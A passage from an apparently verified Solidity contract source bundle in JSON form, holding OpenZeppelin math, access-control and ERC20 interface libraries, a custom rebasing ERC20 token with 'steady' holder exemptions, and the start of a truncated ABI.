}\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 64;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 32;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 16;\\n            }\\n            if (value >> 8 > 0) {\\n                value >>= 8;\\n                result += 8;\\n            }\\n            if (value >> 4 > 0) {\\n                value >>= 4;\\n                result += 4;\\n            }\\n            if (value >> 2 > 0) {\\n                value >>= 2;\\n                result += 2;\\n            }\\n            if (value >> 1 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + (rounding == Rounding.Up && 1 << result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10**64) {\\n                value /= 10**64;\\n                result += 64;\\n            }\\n            if (value >= 10**32) {\\n                value /= 10**32;\\n                result += 32;\\n            }\\n            if (value >= 10**16) {\\n                value /= 10**16;\\n                result += 16;\\n            }\\n            if (value >= 10**8) {\\n                value /= 10**8;\\n                result += 8;\\n            }\\n            if (value >= 10**4) {\\n                value /= 10**4;\\n                result += 4;\\n            }\\n            if (value >= 10**2) {\\n                value /= 10**2;\\n                result += 2;\\n            }\\n            if (value >= 10**1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + (rounding == Rounding.Up && 10**result < value ? 1 : 0);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, rounded down, of a positive value.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >> 128 > 0) {\\n                value >>= 128;\\n                result += 16;\\n            }\\n            if (value >> 64 > 0) {\\n                value >>= 64;\\n                result += 8;\\n            }\\n            if (value >> 32 > 0) {\\n                value >>= 32;\\n                result += 4;\\n            }\\n            if (value >> 16 > 0) {\\n                value >>= 16;\\n                result += 2;\\n            }\\n            if (value >> 8 > 0) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + (rounding == Rounding.Up && 1 << (result * 8) < value ? 1 : 0);\\n        }\\n    }\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/utils/math/SafeMath.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)\\n\\npragma solidity ^0.8.0;\\n\\n// CAUTION\\n// This version of SafeMath should only be used with Solidity 0.8 or later,\\n// because it relies on the compiler's built in overflow checks.\\n\\n/**\\n * @dev Wrappers over Solidity's arithmetic operations.\\n *\\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\\n * now has built in overflow checking.\\n */\\nlibrary SafeMath {\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            uint256 c = a + b;\\n            if (c < a) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b > a) return (false, 0);\\n            return (true, a - b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\\n            // benefit is lost if 'b' is also tested.\\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\n            if (a == 0) return (true, 0);\\n            uint256 c = a * b;\\n            if (c / a != b) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a / b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a % b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity's `+` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Addition cannot overflow.\\n     */\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a + b;\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting on\\n     * overflow (when the result is negative).\\n     *\\n     * Counterpart to Solidity's `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a - b;\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, reverting on\\n     * overflow.\\n     *\\n     * Counterpart to Solidity's `*` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Multiplication cannot overflow.\\n     */\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a * b;\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * Counterpart to Solidity's `/` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a / b;\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\n     * reverting when dividing by zero.\\n     *\\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\n     * invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a % b;\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\\n     * overflow (when the result is negative).\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {trySub}.\\n     *\\n     * Counterpart to Solidity's `-` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - Subtraction cannot overflow.\\n     */\\n    function sub(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b <= a, errorMessage);\\n            return a - b;\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\\n     * division by zero. The result is rounded towards zero.\\n     *\\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function div(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a / b;\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\n     * reverting with custom message when dividing by zero.\\n     *\\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\\n     * message unnecessarily. For custom revert reasons use {tryMod}.\\n     *\\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\n     * invalid opcode to revert (consuming all remaining gas).\\n     *\\n     * Requirements:\\n     *\\n     * - The divisor cannot be zero.\\n     */\\n    function mod(\\n        uint256 a,\\n        uint256 b,\\n        string memory errorMessage\\n    ) internal pure returns (uint256) {\\n        unchecked {\\n            require(b > 0, errorMessage);\\n            return a % b;\\n        }\\n    }\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/access/Ownable.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../utils/Context.sol\\\";\\n\\n/**\\n * @dev Contract module which provides a basic access control mechanism, where\\n * there is an account (an owner) that can be granted exclusive access to\\n * specific functions.\\n *\\n * By default, the owner account will be the one that deploys the contract. This\\n * can later be changed with {transferOwnership}.\\n *\\n * This module is used through inheritance. It will make available the modifier\\n * `onlyOwner`, which can be applied to your functions to restrict their use to\\n * the owner.\\n */\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        _transferOwnership(_msgSender());\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby removing any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\"\r\n    },\r\n    \"base/ERC20Burnable.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/extensions/ERC20Burnable.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./ERC20Rebase.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/Context.sol\\\";\\n\\n/**\\n * @dev Extension of {ERC20} that allows token holders to destroy both their own\\n * tokens and those that they have an allowance for, in a way that can be\\n * recognized off-chain (via event analysis).\\n */\\nabstract contract ERC20Burnable is Context, ERC20Rebase {\\n    /**\\n     * @dev Destroys `amount` tokens from the caller.\\n     *\\n     * See {ERC20-_burn}.\\n     */\\n    function burn(uint256 amount) public virtual {\\n        _burn(_msgSender(), amount);\\n    }\\n\\n    /**\\n     * @dev Destroys `amount` tokens from `account`, deducting from the caller's\\n     * allowance.\\n     *\\n     * See {ERC20-_burn} and {ERC20-allowance}.\\n     *\\n     * Requirements:\\n     *\\n     * - the caller must have allowance for ``accounts``'s tokens of at least\\n     * `amount`.\\n     */\\n    function burnFrom(address account, uint256 amount) public virtual {\\n        _spendAllowance(account, _msgSender(), amount);\\n        _burn(account, amount);\\n    }\\n}\\n\"\r\n    },\r\n    \"base/ERC20Rebase.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT \\r\\n// Rebase Contracts\\r\\n\\r\\npragma solidity ^0.8.0;\\r\\nimport \\\"@openzeppelin/contracts/token/ERC20/IERC20.sol\\\";\\r\\nimport \\\"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\\\";\\r\\nimport \\\"@openzeppelin/contracts/utils/Context.sol\\\";\\r\\n \\r\\ncontract ERC20Rebase is Context, IERC20, IERC20Metadata {\\r\\n    mapping(address => uint256) private _balances;\\r\\n\\r\\n    mapping(address => mapping(address => uint256)) private _allowances;\\r\\n    uint256 private _totalSupply; \\r\\n    string private _name;\\r\\n    string private _symbol;\\r\\n\\r\\n\\r\\n    mapping(address => uint256) private _gonBalances;\\r\\n    mapping(address => bool) private _steady; \\r\\n    uint256 private _perFragment;\\r\\n    uint256 public MAX_SUPPLY;\\r\\n    uint256 private TOTAL_GONS;\\r\\n    uint256 private constant MAX_UINT256 = ~uint256(0);\\r\\n\\r\\n    constructor(string memory name_, string memory symbol_) {\\r\\n        _name = name_;\\r\\n        _symbol = symbol_;\\r\\n    }\\r\\n\\r\\n    function name() public view virtual override returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public view virtual override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n \\r\\n    function decimals() public view virtual override returns (uint8) {\\r\\n        return 18;\\r\\n    }\\r\\n \\r\\n    function totalSupply() public view virtual override returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n    function _setTotalSupply(uint256 amount,bool isAdd) private{\\r\\n        if(isAdd) { \\r\\n            if(_totalSupply == 0){\\r\\n                TOTAL_GONS=MAX_UINT256 / 1e20 - ((MAX_UINT256 / 1e20) % amount);\\r\\n                _perFragment = TOTAL_GONS / amount;\\r\\n            }\\r\\n            else{\\r\\n                TOTAL_GONS+=amount*_perFragment;\\r\\n            }\\r\\n            _totalSupply += amount;\\r\\n        }\\r\\n        else{\\r\\n            TOTAL_GONS-=amount*_perFragment;\\r\\n            _totalSupply-=amount;\\r\\n        } \\r\\n    }\\r\\n\\r\\n    function _reBase(uint256 newTotalSupply) internal virtual{\\r\\n        bool isadd;\\r\\n        uint256 change;\\r\\n        if(newTotalSupply>_totalSupply){\\r\\n            isadd =false;\\r\\n            change=newTotalSupply-_totalSupply;\\r\\n        }\\r\\n        if(newTotalSupply<_totalSupply){\\r\\n            isadd =true;\\r\\n            change=_totalSupply-newTotalSupply;\\r\\n        }\\r\\n        uint256 unChange=holdersbalance()*change/_totalSupply;\\r\\n        _totalSupply = newTotalSupply;\\r\\n        _perFragment = TOTAL_GONS / _totalSupply;\\r\\n        _setTotalSupply(unChange,isadd); \\r\\n    } \\r\\n    function balanceOf(address account) public view virtual override returns (uint256) {\\r\\n\\r\\n        if(_steady[account] ||_totalSupply==0) return _balances[account]; \\r\\n        return _gonBalances[account] / _perFragment;\\r\\n    } \\r\\n    function _setBalance(address account, uint256 amount) private{\\r\\n        if(_steady[account])  _balances[account]=amount;\\r\\n        else _gonBalances[account]= amount * _perFragment;\\r\\n    }\\r\\n\\r\\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\\r\\n        address owner = _msgSender();\\r\\n        _transfer(owner, to, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n\\r\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n  \\r\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\r\\n        address owner = _msgSender();\\r\\n        _approve(owner, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n   \\r\\n    function transferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) public virtual override returns (bool) {\\r\\n        address spender = _msgSender();\\r\\n        _spendAllowance(from, spender, amount);\\r\\n        _transfer(from, to, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\r\\n        address owner = _msgSender();\\r\\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\r\\n        address owner = _msgSender();\\r\\n        uint256 currentAllowance = allowance(owner, spender);\\r\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\r\\n        unchecked {\\r\\n            _approve(owner, spender, currentAllowance - subtractedValue);\\r\\n        }\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _transfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal virtual {\\r\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\r\\n\\r\\n        _beforeTokenTransfer(from, to, amount);\\r\\n\\r\\n        uint256 fromBalance = balanceOf(from);\\r\\n        require(fromBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\r\\n        unchecked {\\r\\n            _setBalance(from,fromBalance - amount);  \\r\\n            _setBalance(to, balanceOf(to) + amount); \\r\\n        }\\r\\n\\r\\n        emit Transfer(from, to, amount);\\r\\n\\r\\n        _afterTokenTransfer(from, to, amount);\\r\\n    }\\r\\n\\r\\n    function _mint(address account, uint256 amount) internal virtual {\\r\\n        require(account != address(0), \\\"ERC20: mint to the zero address\\\");\\r\\n\\r\\n        _beforeTokenTransfer(address(0), account, amount);\\r\\n\\r\\n        \\r\\n        _setTotalSupply(amount,true);\\r\\n        MAX_SUPPLY += amount*1400;\\r\\n        unchecked {\\r\\n            _setBalance(account,balanceOf(account)+ amount);\\r\\n        }\\r\\n        emit Transfer(address(0), account, amount);\\r\\n\\r\\n        _afterTokenTransfer(address(0), account, amount);\\r\\n    }\\r\\n\\r\\n    function _burn(address account, uint256 amount) internal virtual {\\r\\n        require(account != address(0), \\\"ERC20: burn from the zero address\\\");\\r\\n\\r\\n        _beforeTokenTransfer(account, address(0), amount);\\r\\n\\r\\n        uint256 accountBalance = balanceOf(account);\\r\\n        require(accountBalance >= amount, \\\"ERC20: burn amount exceeds balance\\\");\\r\\n        unchecked {\\r\\n            _setBalance(account,accountBalance - amount); \\r\\n            _setTotalSupply(amount,false);\\r\\n            MAX_SUPPLY -= amount*1400;\\r\\n        }\\r\\n\\r\\n        emit Transfer(account, address(0), amount);\\r\\n\\r\\n        _afterTokenTransfer(account, address(0), amount);\\r\\n    }\\r\\n    function _setSteady(address account, bool isSteady) internal virtual{\\r\\n        if( _steady[account] != isSteady ){\\r\\n            if(isSteady) {\\r\\n                _balances[account]= balanceOf(account);\\r\\n                addSteadyHolder(account);\\r\\n            }\\r\\n            if(!isSteady) {\\r\\n                _gonBalances[account]=_balances[account] * _perFragment;\\r\\n                removeSteadyHolder(account);\\r\\n            }\\r\\n            _steady[account]=isSteady;\\r\\n        }\\r\\n    }\\r\\n    address[] public steadyHolders;\\r\\n    mapping(address => uint256) steadyHolderIndexes;\\r\\n\\r\\n    function holdersbalance() internal view returns(uint256 total) {\\r\\n        for (uint i = 0; i < steadyHolders.length; i++) {\\r\\n            total+=balanceOf(steadyHolders[i]);\\r\\n        }\\r\\n    }\\r\\n\\r\\n     function addSteadyHolder(address steadyHolder) internal {\\r\\n        steadyHolderIndexes[steadyHolder] = steadyHolders.length;\\r\\n        steadyHolders.push(steadyHolder);\\r\\n    }\\r\\n\\r\\n    function removeSteadyHolder(address steadyHolder) internal {\\r\\n        steadyHolders[steadyHolderIndexes[steadyHolder]] = steadyHolders[\\r\\n            steadyHolders.length - 1\\r\\n        ];\\r\\n        steadyHolderIndexes[\\r\\n            steadyHolders[steadyHolders.length - 1]\\r\\n        ] = steadyHolderIndexes[steadyHolder];\\r\\n        steadyHolders.pop();\\r\\n    }\\r\\n\\r\\n    \\r\\n    function _approve(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) internal virtual {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n   \\r\\n    function _spendAllowance(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) internal virtual {\\r\\n        uint256 currentAllowance = allowance(owner, spender);\\r\\n        if (currentAllowance != type(uint256).max) {\\r\\n            require(currentAllowance >= amount, \\\"ERC20: insufficient allowance\\\");\\r\\n            unchecked {\\r\\n                _approve(owner, spender, currentAllowance - amount);\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function _beforeTokenTransfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal virtual {}\\r\\n   \\r\\n    function _afterTokenTransfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) internal virtual {}\\r\\n}\\r\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/token/ERC20/IERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 amount\\n    ) external returns (bool);\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/utils/Context.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../IERC20.sol\\\";\\n\\n/**\\n * @dev Interface for the optional metadata functions from the ERC20 standard.\\n *\\n * _Available since v4.1._\\n */\\ninterface IERC20Metadata is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"total_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"InStatusError\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"epoch\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"totalSupply\",\"type\":\"uint256\"}],\"name\":\"LogRebase\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"MAX_SUPPLY\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"NFT\",\"outputs\":[{\"internalType\":\"contract IERC721\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_autoRebase\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_baseToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_lastRebasedTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract 